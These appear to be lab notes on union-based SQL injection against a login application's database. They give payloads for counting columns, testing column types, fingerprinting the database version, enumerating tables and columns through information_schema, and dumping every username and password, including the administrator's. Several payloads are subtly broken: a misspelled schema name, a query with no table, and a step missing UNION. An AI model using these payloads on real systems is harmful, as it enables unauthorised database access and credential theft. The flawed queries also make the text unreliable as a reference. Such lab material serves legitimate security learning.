# For non-Oracle database  

You can list the tables in the database by:  
` select * from inofrmation_schema.tables`  

You can list the columns in individual tables by:  
` select * from information_schema.columns where table_name = 'users'`  


The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.  


1. Find the number of columns  
`' order by 1 --`  
-> 200 ok  
` ' order by 3 --`  
-> 500 error  
-- There are two columns in the table  

2. Find the data type of the columns  
` ' union select 'a', NULL --`  
-> 200 OK: the first column is text type  
` ' union select NULL, 'a' --`  
-> 200 OK: the second column is text type  

3. Find the version of the database  
` ' union select @@version, NULL -- `  
-- Microsoft & MySQL database  
` ' union select version(), NULL --`  
-- PostgreSQL database  

4. Output the list of table names in the database  
` ' union select table_name, NULL from information_schema --`  
-> 200 OK: You will get all the table names.  
-- information_schema in PostgreSQL has table names such as table_name, column_name etc.

5. Ouput the column names of the table  
` ' select column_name, NULL from information_schema.columns where table_name = 'users_xacgsm' --`  
-> 200 OK: we get the username.  
--  information_schema.columns in PostgreSQL has column names such as column_name, table_name etc.  

6. Output the usernames and passwords.  
` ' union select username_pxqwui, password_bgvoxs from user_xacgsm --`  
-> 200 OK: we get the username 'administrator' and its corresponding password.
